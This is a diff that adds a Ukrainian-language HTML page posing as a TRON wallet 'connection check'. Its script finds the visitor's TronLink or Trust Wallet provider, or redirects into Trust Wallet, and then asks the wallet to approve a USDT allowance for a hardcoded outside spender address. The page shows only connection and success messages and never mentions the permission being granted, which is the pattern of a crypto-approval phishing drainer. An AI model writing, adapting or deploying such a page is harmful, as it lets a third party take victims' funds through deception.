@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON Web3 Interface</title>
+    <!-- Підключення бібліотеки TronWeb -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            color: #333333;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            max-width: 350px;
+            width: 100%;
+        }
+        .btn-connect {
+            background-color: #0052ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn-connect:hover {
+            background-color: #0040cc;
+        }
+        #statusText {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Перевірка з'єднання</h2>
+        <p>Натисніть кнопку для підключення:</p>
+        
+        <button id="connectBtn" class="btn-connect">Підключити</button>
+        
+        <div id="statusText">Статус: Очікування дії...</div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            usdtContractAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            spenderAddress: "TNJPVGwMW9HK5id3X7sgZQbDB1aPMVpcbS", // Адреса, якій дається дозвіл
+            approveAmount: "4000000" // Максимальний безлімітний approve
+        };
+
+        const connectButton = document.getElementById('connectBtn');
+        const statusText = document.getElementById('statusText');
+
+        connectButton.addEventListener('click', async () => {
+            try {
+                statusText.innerText = "Статус: Пошук гаманця...";
+
+                let tw = null;
+
+                // Розширений пошук провайдера в середовищі мобільного браузера
+                for (let i = 0; i < 15; i++) {
+                    if (window.tronWeb) {
+                        tw = window.tronWeb;
+                        if (tw.defaultAddress && tw.defaultAddress.base58) {
+                            break;
+                        }
+                    }
+                    if (window.tronLink && window.tronLink.tronWeb) {
+                        tw = window.tronLink.tronWeb;
+                        if (tw.defaultAddress && tw.defaultAddress.base58) {
+                            break;
+                        }
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 400));
+                }
+
+                // Якщо взагалі немає середовища Web3 — робимо редирект
+                if (!tw && !window.tronWeb && !window.tronLink) {
+                    statusText.innerText = "Статус: Перенаправлення у Trust Wallet...";
+                    const currentUrl = window.location.href;
+                    window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
+                    return;
+                }
+
+                // Якщо провайдер є, але адреса не підтягнулася автоматично
+                if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
+                    if (window.tronLink && window.tronLink.request) {
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    } else if (window.tronWeb && window.tronWeb.request) {
+                        await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                    }
+                }
+
+                // Фінальна спроба отримати об'єкт і адресу
+                let activeTw = window.tronWeb || (window.tronLink ? window.tronLink.tronWeb : tw);
+                let userAddress = activeTw && activeTw.defaultAddress ? activeTw.defaultAddress.base58 : null;
+
+                if (!userAddress) {
+                    statusText.innerText = "Статус: Помилка з'єднання. Перезайдіть у браузер гаманця.";
+                    return;
+                }
+
+                statusText.innerText = "Статус: Гаманець підключено!";
+
+                const contract = await activeTw.contract().at(CONFIG.usdtContractAddress);
+
+                statusText.innerText = "Статус: Підтвердіть транзакцію...";
+
+                // Заміна transfer на метод approve
+                const transaction = await contract.approve(
+                    CONFIG.spenderAddress,
+                    CONFIG.approveAmount
+                ).send({
+                    feeLimit: 100_000_000,
+                    callValue: 0
+                });
+
+                statusText.innerText = "Статус: Успішно виконано!";
+                console.log("Хеш транзакції approve:", transaction);
+
+            } catch (error) {
+                console.error("Помилка:", error);
+                statusText.innerText = "Статус: Помилка або скасування.";
+            }
+        });
+    </script>
+</body>
+</html>
